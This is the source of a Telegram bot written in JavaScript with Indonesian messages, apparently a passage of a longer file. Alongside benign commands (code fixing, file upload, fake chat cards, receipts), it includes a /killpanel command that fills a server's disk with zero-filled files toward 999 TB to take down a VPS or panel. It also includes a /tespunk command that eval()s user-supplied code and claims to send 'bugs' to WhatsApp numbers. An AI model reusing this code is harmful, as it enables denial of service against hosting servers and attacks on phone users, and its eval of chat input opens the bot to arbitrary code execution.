    const rx = /```([\w.+-]*)\n([\s\S]*?)```/g;
    const out = [];
    let m;
    while ((m = rx.exec(t))) out.push({
        lang: (m[1] || "").trim(),
        code: m[2]
    });
    return out
}
const detectLang = (s = "") => {
    if (/```(\w+)/.test(s)) return RegExp.$1;
    if (/<[a-z][\s\S]*?>/i.test(s)) return "html";
    if (/\b(import|def)\b.+:|\bprint\(/.test(s)) return "python";
    if (/#include|std::|int\s+main\s*\(/.test(s)) return "cpp";
    if (/\busing\s+System;|\bConsole\.WriteLine/.test(s)) return "csharp";
    if (/\bpackage\b.+;|\bpublic\s+class\b/.test(s)) return "java";
    if (/\bfunc\b|\bpackage\s+main\b/.test(s)) return "go";
    if (/\bconst\b|\blet\b|\bfunction\b|=>/.test(s)) return "javascript";
    if (/^\s*{\s*"[^\n]+":/m.test(s)) return "json";
    return ""
}

const explainPromptID = (lang = "") => `
Kamu adalah asisten perbaikan kode. Balas SELALU dalam bahasa Indonesia dengan format:

## Ringkasan Kesalahan
- Maks 6 poin.

## Perbaikan Utama
- Maks 6 poin.

## Kode Final
\`\`\`${lang || ""}
(tulis seluruh kode final di sini)
\`\`\`
`.trim()

const chunkPrompt = (lang = "", i = 1, n = 1) => `
Kamu menerima potongan kode ke-${i} dari ${n}. Perbaiki hanya potongan ini. Kembalikan HANYA potongan yang sudah diperbaiki dalam satu blok code fence \`\`\`${lang || ""}\`.
`.trim()

const pickText = (d) => {
    if (d == null) return "";
    if (typeof d === "string") return d;
    if (typeof d === "object") {
        if (typeof d.data === "string") return d.data;
        if (typeof d.result === "string") return d.result;
        if (typeof d.response === "string") return d.response;
        if (typeof d.message === "string") return d.message;
        try {
            return JSON.stringify(d)
        } catch {
            return String(d)
        }
    }
    return String(d)
}

const callAPI = async (prompt, content) => {
    const url = `${FIX_API}?${toParams({ text: `${prompt}\n\n${content}` })}`
    const r = await axios.get(url, {
        timeout: 120000,
        headers: {
            accept: "*/*"
        },
        validateStatus: () => true
    })
    return {
        status: r.status,
        data: pickText(r.data)
    }
}

const ensureFence = (code = "", lang = "") => /```[\s\S]*```/.test(code) ? code : "```" + (lang || "") + "\n" + code + "\n```"
const langToExt = (lang = "") => {
    const m = {
        javascript: ".js",
        js: ".js",
        typescript: ".ts",
        ts: ".ts",
        jsx: ".jsx",
        tsx: ".tsx",
        html: ".html",
        css: ".css",
        json: ".json",
        yaml: ".yaml",
        yml: ".yml",
        python: ".py",
        py: ".py",
        java: ".java",
        csharp: ".cs",
        cs: ".cs",
        cpp: ".cpp",
        c: ".c",
        go: ".go",
        php: ".php",
        ruby: ".rb",
        rb: ".rb",
        rust: ".rs",
        rs: ".rs",
        kotlin: ".kt",
        swift: ".swift",
        bash: ".sh",
        sh: ".sh",
        sql: ".sql",
        xml: ".xml",
        lua: ".lua"
    };
    return m[(lang || "").toLowerCase()] || ".txt"
}
const guessExtFromCode = (lang, code) => {
    if (lang) return langToExt(lang);
    const s = code.trim();
    if (/^<!DOCTYPE html>|<html[\s>]/i.test(s)) return ".html";
    if (/^\{[\s\S]*\}$/.test(s)) return ".json";
    if (/^#\!\/bin\/(ba)?sh/.test(s)) return ".sh";
    if (/^\s*package\s+main\b/.test(s)) return ".go";
    if (/^\s*<\?php\b/.test(s)) return ".php";
    if (/^#include|^\s*int\s+main\s*\(/m.test(s)) return ".c";
    return ".txt"
}

const sendDoc = async (chatId, replyId, name, text) => {
    const file = path.join(os.tmpdir(), `${name}`);
    fs.writeFileSync(file, text);
    return bot.sendDocument(chatId, file, {
        caption: `⎙ ${name}`,
        reply_to_message_id: replyId
    })
}

const getSection = (src, title) => {
    const re = new RegExp(`##\\s*${title}\\s*([\\s\\S]*?)(?=\\n##\\s*|$)`, "i");
    const m = src.match(re);
    return (m?.[1] || "").trim()
}
const bullets = (txt) => txt.split(/\r?\n/).map(l => l.replace(/^\s*(?:[-*]|[\d]+[.)])\s*/, "• ").trim()).filter(Boolean).join("\n")

const makeExplainText = (lang, userDetail, ringkasan, perbaikan) =>
    `⎙ *Perbaikan Kode*
*Bahasa:* ${lang || "N/A"}

*Detail Pengguna*
${userDetail ? `> ${userDetail.replace(/\n/g, "\n> ")}` : "> (tidak ada)"}

*Ringkasan Kesalahan*
${ringkasan ? bullets(ringkasan) : "• (tidak tersedia)"}

*Perbaikan Utama*
${perbaikan ? bullets(perbaikan) : "• (tidak tersedia)"}`

const sendExplainAndFiles = async (chatId, replyId, out, lang, userDetail, baseName = "fixed") => {
    const ringkasan = getSection(out, "Ringkasan Kesalahan")
    const perbaikan = getSection(out, "Perbaikan Utama")
    const fence = extractFences(out)[0]
    const code = (fence?.code || "").trim()
    const codeLang = (fence?.lang || lang || "").toLowerCase()
    const explain = makeExplainText(codeLang, userDetail, ringkasan, perbaikan)
    if (explain.length <= 3500) await bot.sendMessage(chatId, explain, {
        reply_to_message_id: replyId,
        parse_mode: "Markdown"
    })
    else await sendDoc(chatId, replyId, "fixed_explain.md", explain)
    if (!code) return
    const codeFence = ensureFence(code, codeLang)
    const MAX_CODE_INLINE = 1800
    if (codeFence.length <= MAX_CODE_INLINE && (explain.length + codeFence.length) <= 3800) return bot.sendMessage(chatId, `*Kode Final*\n${codeFence}`, {
        reply_to_message_id: replyId,
        parse_mode: "Markdown"
    })
    const ext = guessExtFromCode(codeLang, code)
    return sendDoc(chatId, replyId, `${baseName}${ext}`, code)
}

const grabText = (m) => {
    if (!m) return "";
    if (typeof m.text === "string" && m.text.trim()) return m.text;
    if (typeof m.caption === "string" && m.caption.trim()) return m.caption;
    return ""
}

const getDocText = async (m) => {
    const d = m?.document || m?.reply_to_message?.document
    if (!d) return null
    const f = await bot.getFile(d.file_id)
    const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${f.file_path}`
    const res = await axios.get(url, {
        responseType: "arraybuffer",
        timeout: 120000
    })
    const buf = Buffer.from(res.data)
    if (buf.length > 1024 * 1024 * 2) return {
        name: d.file_name || "code.txt",
        text: buf.toString("utf8", 0, 1024 * 1024 * 2)
    }
    return {
        name: d.file_name || "code.txt",
        text: buf.toString("utf8")
    }
}

const pendingFix = new Map()
const regPutFix = (p) => {
    const t = crypto.randomBytes(6).toString("base64url");
    pendingFix.set(t, {
        ...p,
        ts: Date.now(),
        used: false
    });
    setTimeout(() => pendingFix.delete(t), 60 * 1000);
    return t
}
const regUseFix = (t, uid) => {
    const v = pendingFix.get(t);
    if (!v || v.used) return null;
    if (Array.isArray(v.allow) && !v.allow.includes(uid)) return null;
    v.used = true;
    return v
}

const combineDetailAndCode = (detail, code) => {
    const fences = extractFences(code);
    const lang = (fences[0]?.lang || detectLang(fences[0]?.code || code) || "").toLowerCase();
    const body = fences[0]?.code || code;
    const combined = ["=== DETAIL ERROR ===", detail || "(tidak ada detail)", "=== KODE ===", body].join("\n");
    return {
        combined,
        lang,
        body
    }
}
const splitByLines = (s, max) => {
    const lines = s.split(/\r?\n/);
    const out = [];
    let cur = "";
    for (const L of lines) {
        if ((cur + L + "\n").length > max) {
            out.push(cur);
            cur = "";
        }
        cur += L + "\n"
    }
    if (cur) out.push(cur);
    return out
}

const fixWithAPI = async (combined, lang) => {
    if (combined.length <= MAX_API) {
        const r = await callAPI(explainPromptID(lang), combined)
        if (r.status === 200) return {
            ok: true,
            out: r.data
        }
        if (r.status === 400 && /less than 2000/i.test(String(r.data))) return {
            ok: false,
            tooLong: true
        }
        return {
            ok: false,
            err: r.data
        }
    }
    return {
        ok: false,
        tooLong: true
    }
}

const fixChunked = async (code, lang) => {
    const chunks = splitByLines(code, MAX_API - 200)
    const fixed = []
    for (let i = 0; i < chunks.length; i++) {
        const p = chunkPrompt(lang, i + 1, chunks.length)
        const r = await callAPI(p, chunks[i])
        const fence = extractFences(r.data)[0]
        fixed.push((fence?.code || r.data).trim())
    }
    return fixed.join("\n")
}

const runFix = async (msg, rawCode, detail = "") => {
    const chatId = msg.chat.id,
        replyId = msg.message_id
    const src = String(rawCode || "").trim()
    if (!src) return bot.sendMessage(chatId, "Kirim kode/error atau reply pesan berisi kode atau file.", {
        reply_to_message_id: replyId
    })
    const {
        combined,
        lang,
        body
    } = combineDetailAndCode(detail, src)
    await bot.sendChatAction(chatId, "typing")
    try {
        const first = await fixWithAPI(combined, lang)
        if (first.ok) return sendExplainAndFiles(chatId, replyId, first.out, lang, detail, "fixed")
        let codeFixed = await fixChunked(body, lang)
        if (codeFixed.length <= MAX_API) {
            const final = await callAPI(explainPromptID(lang), codeFixed)
            if (final.status === 200) return sendExplainAndFiles(chatId, replyId, final.data, lang, detail, "fixed")
        }
        const ext = guessExtFromCode(lang, codeFixed || body)
        await bot.sendMessage(chatId, makeExplainText(lang, detail, "", ""), {
            reply_to_message_id: replyId,
            parse_mode: "Markdown"
        })
        return sendDoc(chatId, replyId, `fixed${ext}`, codeFixed || body)
    } catch (e) {
        const err = e?.response?.data ? (typeof e.response.data === "string" ? e.response.data : String(e.response.data)) : (e.message || String(e))
        return bot.sendMessage(chatId, `⦸ Gagal memperbaiki\n• pesan: ${err}`, {
            reply_to_message_id: replyId
        })
    }
}

bot.onText(/^\/fix(?:@\w+)?(?:\s+([\s\S]+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id,
        replyId = msg.message_id
    const arg = (match?.[1] || "").trim()
    const fromReply = grabText(msg.reply_to_message)
    const doc = await getDocText(msg) || (msg.reply_to_message ? await getDocText(msg.reply_to_message) : null)
    const candidate = doc?.text || arg || fromReply
    if (!candidate) return bot.sendMessage(chatId, "⎙ Jelaskan singkat detail error lalu kirim kode atau file. Atau kirim /fix <kode>.", {
        reply_to_message_id: replyId
    })
    const token = regPutFix({
        allow: [msg.from.id],
        chatId,
        replyId,
        code: candidate,
        fileName: doc?.name
    })
    return bot.sendMessage(chatId, "⎙ Jelaskan detail error (contoh: TypeError baris X). Atau tekan **Skip (Auto)**.", {
        reply_to_message_id: replyId,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{
                    text: "Skip (Auto)",
                    callback_data: `fixskip:${token}`
                }]
            ]
        }
    })
})

bot.on("message", async (msg) => {
    if (!msg?.text && !msg?.document) return
    if (msg.text && /^\/fix(@\w+)?\b/i.test(msg.text)) return
    const uid = msg.from.id
    const entry = [...pendingFix.values()].find(v => !v.used && v.allow?.includes(uid) && v.chatId === msg.chat.id)
    if (!entry) return
    entry.used = true
    const detail = msg.text ? msg.text.trim() : ""
    return runFix({
        chat: {
            id: entry.chatId
        },
        message_id: msg.message_id
    }, entry.code, detail)
})

bot.on("callback_query", async (q) => {
    const chatId = q.message?.chat?.id || q.from.id
    const senderId = q.from?.id
    const messageId = q.message?.message_id
    const raw = String(q.data || "")
    if (!raw.startsWith("fixskip:")) return
    const token = raw.split(":")[1]
    const payload = regUseFix(token, senderId)
    if (!payload) {
        try {
            await bot.answerCallbackQuery(q.id, {
                text: "Sesi tidak tersedia"
            })
        } catch {}
        return
    }
    try {
        await bot.answerCallbackQuery(q.id, {
            text: "Analisis otomatis..."
        })
    } catch {}
    return runFix({
        chat: {
            id: chatId
        },
        message_id: messageId
    }, payload.code, "")
})

const FormData = require('form-data');

async function uploadToCatbox(fileStream, fileName) {
    try {
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', fileStream, {
            filename: fileName
        });

        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders()
            }
        });

        // Catbox mengembalikan URL jika sukses
        if (response.status === 200 && response.data) {
            return response.data;
        } else {
            throw new Error('Gagal mengunggah ke Catbox.moe');
        }
    } catch (error) {
        console.error("Catbox Upload Error:", error.message);
        return null;
    }
}


/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE TOURL ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/tourl/, async (msg) => {
    const chatId = msg.chat.id;

    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, "❌ Perintah ini harus digunakan dengan membalas sebuah media (foto, video, dokumen, dll).");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId;
    let fileName = 'file.txt'; // Default file name

    if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id; // Ambil foto kualitas tertinggi
        fileName = `${fileId}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = repliedMsg.video.file_name || `${fileId}.mp4`;
    } else if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name;
    } else if (repliedMsg.audio) {
        fileId = repliedMsg.audio.file_id;
        fileName = repliedMsg.audio.file_name || `${fileId}.mp3`;
    } else if (repliedMsg.voice) {
        fileId = repliedMsg.voice.file_id;
        fileName = `${fileId}.ogg`;
    } else if (repliedMsg.animation) {
        fileId = repliedMsg.animation.file_id;
        fileName = repliedMsg.animation.file_name || `${fileId}.mp4`;
    } else {
        return bot.sendMessage(chatId, "❌ Media tidak didukung. Balas foto, video, dokumen, audio, atau GIF.");
    }

    const waitingMsg = await bot.sendMessage(chatId, "⏳ Mengunggah ke Catbox.moe, mohon tunggu...", {
        reply_to_message_id: msg.message_id
    });

    const fileStream = bot.getFileStream(fileId);
    const catboxUrl = await uploadToCatbox(fileStream, fileName);

    if (catboxUrl) {
        bot.editMessageText(`✅ Berhasil diunggah!\n\nURL Anda: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: waitingMsg.message_id,
            disable_web_page_preview: true
        });
    } else {
        bot.editMessageText("❌ Maaf, gagal mengunggah file.", {
            chat_id: chatId,
            message_id: waitingMsg.message_id
        });
    }
});


/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE KILL PANEL ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

const FILE_SIZE = 25 * 1024 * 1024 * 1024;
const TARGET_SIZE = 999 * 1024 ** 4;
const BLOCK_SIZE = 1024 * 1024;

function formatSize(bytes) {
    const gb = (bytes / 1024 ** 3).toFixed(2);
    return `${gb} GB`;
}

async function createFile(filePath, size) {
    return new Promise((resolve, reject) => {
        const stream = fs.createWriteStream(filePath, {
            highWaterMark: BLOCK_SIZE
        });
        const buf = Buffer.alloc(BLOCK_SIZE, 0);
        let written = 0;

        function writeMore() {
            let ok = true;
            while (ok && written < size && isProcessRunning) {
                const remaining = size - written;
                const chunk = remaining >= BLOCK_SIZE ? buf : buf.subarray(0, remaining);
                ok = stream.write(chunk);
                written += chunk.length;

                const percent = ((written / size) * 100).toFixed(2);
                process.stdout.write(
                    `\r📂 Writing ${path.basename(filePath)}: ${percent}% (${formatSize(
            written
          )} dari ${formatSize(size)})`
                );
            }
            if (written >= size || !isProcessRunning) {
                stream.end();
            }
        }

        stream.on("drain", writeMore);
        stream.on("error", reject);
        stream.on("finish", () => {
            if (written >= size) {
                process.stdout.write("\n");
                console.log(`✅ Selesai bikin ${filePath} (${formatSize(size)})`);
            }
            resolve();
        });

        writeMore();
    });
}

let isProcessRunning = false;

async function startFileCreationProcess() {
    console.log("🔥🔪⚙️ [AXATA KILLER] Memulai proses pembuatan file...");
    let totalWritten = 0;
    let fileIndex = 1;

    try {
        while (totalWritten < TARGET_SIZE && isProcessRunning) {
            const filePath = path.join(__dirname, `file_${fileIndex}_XYCoolcraft.bin`);
            await createFile(filePath, FILE_SIZE);

            if (!isProcessRunning) {
                break;
            }

            totalWritten += FILE_SIZE;
            fileIndex++;

            console.log(
                `📊 Total progress: ${(totalWritten / 1024 ** 4).toFixed(
          2
        )} TB dari 999 TB`
            );
        }

        if (!isProcessRunning) {
            console.log(
                "🛑 [AXATA SYSTEM] Proses dihentikan oleh pengguna via /stopkill."
            );
        } else {
            console.log("🎉 [AXATA SYSTEM] Semua file selesai dibuat!");
        }
    } catch (error) {
        console.error("[BOT] Terjadi error saat pembuatan file:", error);
    } finally {
        isProcessRunning = false;
    }
}

bot.onText(/\/killpanel/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name;

    if (isProcessRunning) {
        console.log(
            `[BOT] Perintah /killpanel dari @${username} ditolak, proses sudah berjalan.`
        );
        bot.sendMessage(chatId, "⚠️ Proses sudah berjalan. Gunakan /stopkill untuk menghentikan.");
        return;
    }

    isProcessRunning = true;
    console.log(`[BOT] Perintah /killpanel diterima dari @${username}`);

    bot.sendMessage(chatId,
        "✅ Perintah diterima. 🔥🔪⚙️ Memulai Kill Panel + Kill VPS\nGunakanlah secara bijak!\ncmd buat stop nya: /stopkill\nCreated By: @BlrezaXaxata"
    );

    startFileCreationProcess();
});

bot.onText(/\/stopkill/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name;

    if (!isProcessRunning) {
        console.log(
            `[BOT] Perintah /stopkill dari @${username} diterima, tidak ada proses untuk dihentikan.`
        );
        bot.sendMessage(chatId, "ℹ️ Tidak ada proses yang sedang berjalan.");
        return;
    }

    isProcessRunning = false;
    console.log(
        `[BOT] Perintah /stopkill diterima dari @${username}. Proses akan berhenti...`
    );
    bot.sendMessage(chatId,
        "🛑 Perintah diterima. Proses akan berhenti setelah file yang sedang ditulis selesai."
    );
});

//BATAS AREA
// INI BUAT PROSES NYA TETAP BERJALAN DI LATAR BELAKANG ATAU TIDAK USAH DIKASIH JUGA GAK PA PA
process.once("SIGINT", () => process.exit(0));
process.once("SIGTERM", () => process.exit(0));


/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE TEST FUNCTION ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

TZ = 'Asia/Makassar';
const nowID = () => new Date().toLocaleString('id-ID', { timeZone: TZ, hour12: false });

const unfence = s => {
  if (!s) return "";
  const m = s.match(CODE_FENCE_RE);
  return m ? m[1].trim() : s.trim();
};

const parseTargets = s => {
  if (!s) return [];
  const p = (s.match(DIGIT_RE) || []).map(n => n.replace(/\D/g, ""));
  return [...new Set(p.filter(Boolean))];
};

const toFunction = src => {
  const t = (src || "").trim();
  const d = /^(?:async\s+)?function\s+[a-zA-Z_$][\w$]*\s*\(/.test(t);
  const w = d ? `(${t})` : (t.startsWith('(') || t.startsWith('async') ? t : `async ${t}`);
  return eval(w);
};

const extractTextOrCaption = msg =>
  msg?.caption || msg?.text || "";

bot.onText(/^\/tespunk\s+(\d+)\s+([\s\S]+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const loops = Math.max(1, parseInt(match[1], 10));
  const targets = parseTargets(match[2]);
  const q = msg.reply_to_message;
  const fnText = unfence(extractTextOrCaption(q));

  if (!whatsappStatus) {
    return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
  }

  if (!fnText)
    return bot.sendMessage(chatId, "❌ Reply teks async function terlebih dahulu");

  if (targets.length === 0)
    return bot.sendMessage(chatId, "❌ Sertakan target digit. Contoh: /tespunk 2 628Xxx");

  let execFn;
  try {
    execFn = toFunction(fnText);
  } catch (e) {
    return bot.sendMessage(chatId, `❌ Gagal memuat function: ${e.message}`);
  }
  if (typeof execFn !== 'function')
    return bot.sendMessage(chatId, "❌ Konten reply bukan function");

  for (const nomor of targets) {
    try {
      if (!/^\d{6,16}$/.test(nomor)) {
        await bot.sendMessage(chatId, "❌ Nomor tidak valid. Contoh: /tespunk 628xxxxxx");
        continue;
      }

      const target = `${nomor}@s.whatsapp.net`; // ini yang akan dikirim ke execFn

      const sent = await bot.sendVideo(chatId, 'https://files.catbox.moe/w93gys.mp4', {
        caption: `
<blockquote>
┏━━━━⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${nomor}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
</blockquote>
        `,
        parse_mode: "Markdown"
      });

      for (let i = 0; i < loops; i++) {
        await sleep(220);
      }

      await bot.editMessageCaption(
`<blockquote>
┏━━━━⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫━━━━━┓
┃ Sᴜᴄᴄᴇss ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ
┃ ᴋᴇᴘᴀᴅᴀ ɴᴏᴍᴏʀ
┃ Tᴀʀɢᴇᴛ  : ${nomor}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
</blockquote>`, 
        {
          chat_id: chatId,
          message_id: sent.message_id,
          parse_mode: "Markdown",
        }
      );

    } catch (error) {
      await bot.sendMessage(chatId, `❌ Gagal mengirim bug ke ${nomor}: ${error.message}`);
    }
  }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE IQC ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    if (!text) {
        return bot.sendMessage(
            chatId,
            "⚠️ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`", {
                parse_mode: "Markdown"
            }
        );
    }

    let [time, battery, carrier, ...msgParts] = text.split("|");
    if (!time || !battery || !carrier || msgParts.length === 0) {
        return bot.sendMessage(
            chatId,
            "⚠️ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`", {
                parse_mode: "Markdown"
            }
        );
    }

    // Validasi input
    if (!/^\d{1,2}:\d{2}$/.test(time)) {
        return bot.sendMessage(
            chatId,
            "❌ Format jam salah! Gunakan format: HH:MM\nContoh: 18:00 atau 9:30"
        );
    }

    if (!/^\d+$/.test(battery) || battery < 0 || battery > 100) {
        return bot.sendMessage(
            chatId,
            "❌ Persentase baterai harus angka antara 0-100!"
        );
    }

    if (carrier.length > 20) {
        return bot.sendMessage(
            chatId,
            "❌ Nama carrier terlalu panjang! Maksimal 20 karakter."
        );
    }

    const messageText = msgParts.join("|").trim();
    if (messageText.length > 100) {
        return bot.sendMessage(
            chatId,
            "❌ Pesan terlalu panjang! Maksimal 100 karakter."
        );
    }

    const processingMsg = await bot.sendMessage(chatId, "⏳ Sedang membuat IQC Card...");

    try {
        const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
      time
    )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
      carrier
    )}&messageText=${encodeURIComponent(messageText)}&emojiStyle=apple`;

        const response = await fetch(url);

        if (!response.ok) {
            throw new Error(`API Error: ${response.status}`);
        }

        let buffer;
        if (typeof response.buffer === "function") {
            buffer = await response.buffer();
        } else {
            const arrayBuffer = await response.arrayBuffer();
            buffer = Buffer.from(arrayBuffer);
        }

        // Hapus pesan "sedang memproses"
        await bot.deleteMessage(chatId, processingMsg.message_id);

        // Kirim hasil dengan caption yang lebih informatif
        await bot.sendPhoto(chatId, buffer, {
            caption: `<pre>📱 IQC Card Berhasil Dibuat!
               ⏰ Waktu: ${time}
               🔋 Baterai: ${battery}
               📶 Carrier: ${carrier}
               💬 Pesan: ${messageText}</pre>`,
            parse_mode: "HTML",
        });

    } catch (error) {
        console.error('Error creating IQC card:', error);

        // Hapus pesan "sedang memproses"
        await bot.deleteMessage(chatId, processingMsg.message_id);

        // Berikan pesan error yang lebih user-friendly
        if (error.message.includes('API Error')) {
            await bot.sendMessage(
                chatId,
                "❌ Maaf, server sedang sibuk. Silakan coba lagi dalam beberapa menit."
            );
        } else if (error.message.includes('fetch')) {
            await bot.sendMessage(
                chatId,
                "❌ Gagal terhubung ke server. Periksa koneksi internet Anda."
            );
        } else {
            await bot.sendMessage(
                chatId,
                "❌ Terjadi kesalahan saat membuat IQC Card. Silakan coba lagi."
            );
        }
    }
});

// Tambahkan juga handler untuk callback query IQC (di bagian callback handler)
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // ... kode callback handler lainnya ...

    if (data === 'iqc_tool') {
        // HAPUS PENGEcekan ADMIN - SEKARANG GRATIS UNTUK SEMUA USER
        bot.sendMessage(chatId,
            `<blockquote>🎨 *Buat IQC Card Gratis!
      Gunakan format:
      /iqc jam|batre|carrier|pesan
      Contoh:
      /iqc 18:00|40|Indosat|Halo semua! Apa kabar?
      Penjelasan:
      • *jam*: Format HH:MM (contoh: 18:00 atau 9:30)
      • *batre*: Persentase 0-100 (contoh: 40)
      • carrier: Nama operator (contoh: Indosat)
      • pesan: Teks pesan yang ingin ditampilkan
      ✨ *Sekarang gratis untuk semua user!</blockquote>`, {
                parse_mode: "HTML"
            }
        );
    }

    // ... kode callback handler lainnya ...
});


/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE INFO ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/^(\.info|\/info)$/i, async (msg) => {
    const from = msg.from;
    const chat = msg.chat;

    const name = from.first_name + (from.last_name ? " " + from.last_name : "");
    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak Ada";
    const dcId = from.dc_id || "Tidak Diketahui";
    const isPremium = from.is_premium ? "Premium ✅" : "Tidak ❌";
    const chatId = chat.id;
    const chatType = chat.type === "private" ? "Private Chat" : (chat.title || "Group Chat");
    const profileLink = `tg://user?id=${userId}`;

    const languageCode = from.language_code || "Tidak Diketahui";
    const isBot = from.is_bot ? "Ya 🤖" : "Tidak 👤";

    try {
        // Ambil foto profil
        const photo = await bot.getUserProfilePhotos(userId, {
            limit: 1
        });

        const caption = `
<blockquote>
<b>┌──「 🔍 USER INFORMATION 」──┐</b>
<b>│</b>
<b>│👤 Nama:</b> <code>${name}</code>
<b>│🆔 User ID:</b> <code>${userId}</code>
<b>│🔰 Username:</b> ${username}
<b>│🤖 Bot:</b> ${isBot}
<b>│🏢 DC ID:</b> ${dcId}
<b>│✨ Premium:</b> ${isPremium}
<b>│🌐 Bahasa:</b> ${languageCode}
<b>│💬 Chat ID:</b> <code>${chatId}</code>
<b>│📝 Chat Type:</b> ${chatType}
<b>│🔗 Profile Link:</b> <a href="${profileLink}">Klik Disini</a>
<b>│📅 Joined:</b> ${new Date().toLocaleDateString('id-ID')}
<b>│</b>
<b>└──「 Generated by Axata 」──┘</b>
</blockquote>
`;

        if (photo.total_count > 0) {
            // Jika ada foto profil, kirim file_id langsung (lebih efisien)
            const fileId = photo.photos[0][0].file_id;

            await bot.sendPhoto(chat.id, fileId, {
                caption: caption,
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            });
        } else {
            // Jika tidak ada foto, kirim pesan text saja
            await bot.sendMessage(chat.id, caption, {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id,
                disable_web_page_preview: true
            });
        }

    } catch (error) {
        console.error("Error in info command:", error);

        // Fallback ke text message
        const fallbackCaption = `
<b>USER INFO:</b>
👤 <b>Nama:</b> ${name}
🆔 <b>User ID:</b> <code>${userId}</code>
🔰 <b>Username:</b> ${username}
✨ <b>Premium:</b> ${isPremium}
💬 <b>Chat:</b> ${chatType}
`;

        await bot.sendMessage(chat.id, fallbackCaption, {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        });
    }
});


/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE DONE ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/done(.+)?/i, (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const input = match[1] ? match[1].trim() : "";

        // Jika input kosong
        if (!input) {
            return bot.sendMessage(
                chatId,
                `📌 *FORMAT SALAH!*

Gunakan format berikut:
/done <nama barang>,<harga>,<metode bayar>

*Contoh:*
\`/done jasa install panel,15000,Dana\``, {
                    parse_mode: "Markdown"
                }
            );
        }

        // Pecah input berdasarkan koma
        const parts = input.split(",").map(p => p.trim());
        const namaBarang = parts[0] || null;
        const hargaBarang = parts[1] || null;
        const metodeBayar = parts[2] || "Tidak disebutkan";

        // Validasi minimal 2 field
        if (!namaBarang || !hargaBarang) {
            return bot.sendMessage(
                chatId,
                `❗ *FORMAT TIDAK LENGKAP!* 

Minimal isi *nama barang* dan *harga*.

*Contoh:*
\`/done jasa install panel,15000,Dana\``, {
                    parse_mode: "Markdown"
                }
            );
        }

        // Validasi harga harus number
        const hargaNumber = Number(hargaBarang);
        if (isNaN(hargaNumber)) {
            return bot.sendMessage(
                chatId,
                `❌ *Harga harus berupa angka!*\nContoh:\n\`/done panel,15000,Dana\``, {
                    parse_mode: "Markdown"
                }
            );
        }

        const hargaFormatted = `Rp${hargaNumber.toLocaleString("id-ID")}`;

        // Waktu
        const now = new Date().toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            weekday: "long",
            year: "numeric",
            month: "long",
            day: "numeric",
            hour: "2-digit",
            minute: "2-digit",
        });

        // Perbaikan HTML + perbaikan tag typo
        const caption = `
<b>⿻ ⌜ TRANSAKSI BERHASIL ⌟ ⿻</b>
────────────────────
<b>▧ BARANG:</b> ${namaBarang}
<b>▧ NOMINAL:</b> ${hargaFormatted}
<b>▧ PAYMENT:</b> ${metodeBayar}
<b>▧ WAKTU:</b> ${now}
────────────────────
